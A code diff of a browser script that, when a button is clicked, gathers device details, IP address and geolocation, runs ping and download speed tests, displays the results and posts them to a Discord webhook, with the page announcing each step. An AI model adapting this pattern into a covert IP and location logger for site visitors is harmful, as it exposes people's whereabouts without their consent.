@@ -1,3 +1,4 @@
+
 // --- CONFIG ---
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/XXXX/XXXX";
 
@@ -22,7 +23,6 @@ function collectClientInfo() {
     cpuCores: navigator.hardwareConcurrency || "unknown",
     touchSupport: navigator.maxTouchPoints || 0
   };
-
   if (navigator.userAgentData) {
     client.userAgentData = {
       mobile: navigator.userAgentData.mobile,
@@ -43,7 +43,7 @@ async function fetchGeo() {
 // --- Network tests ---
 // Ping test: average of 3 small fetches
 async function testPing() {
-  const url = "https://www.cloudflare.com/favicon.ico"; // tiny file
+  const url = "https://www.cloudflare.com/cdn-cgi/trace";
   const attempts = 3;
   let times = [];
   for (let i = 0; i < attempts; i++) {
@@ -55,9 +55,9 @@ async function testPing() {
   return Math.round(avg);
 }
 
-// Download test: fetch ~5MB file
+// Download speed test: fetch ~5MB from Cloudflare
 async function testDownload() {
-  const url = "https://speed.hetzner.de/5MB.bin"; // test file
+  const url = "https://speed.cloudflare.com/__down?bytes=5000000"; // 5MB
   const start = performance.now();
   const res = await fetch(url, { cache: "no-store" });
   const blob = await res.blob();
@@ -73,7 +73,6 @@ async function sendToDiscord(payload) {
     console.warn('Webhook not set, skipping.');
     return { skipped: true };
   }
-
   const body = {
     content: '```json\n' + safeStringify(payload) + '\n```',
     embeds: [{
@@ -91,7 +90,6 @@ async function sendToDiscord(payload) {
       timestamp: new Date().toISOString()
     }]
   };
-
   const res = await fetch(DISCORD_WEBHOOK_URL, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -105,19 +103,14 @@ async function sendToDiscord(payload) {
 btn.addEventListener('click', async () => {
   btn.disabled = true;
   statusEl().textContent = 'Collecting...';
-
   try {
     const client = collectClientInfo();
-
     statusEl().textContent = 'Fetching IP & geo...';
     const geo = await fetchGeo();
-
     statusEl().textContent = 'Testing ping...';
     const ping = await testPing();
-
     statusEl().textContent = 'Testing download speed...';
     const downloadMbps = await testDownload();
-
     const full = Object.assign({}, client, {
       ip: geo.ip || null,
       city: geo.city || null,
@@ -130,10 +123,8 @@ btn.addEventListener('click', async () => {
       downloadMbps,
       geo_raw: geo
     });
-
     outputEl().textContent = safeStringify(full);
     statusEl().textContent = 'Sending to Discord...';
-
     const sendRes = await sendToDiscord(full);
     if (sendRes.skipped) {
       statusEl().textContent = 'Done — webhook not set.';
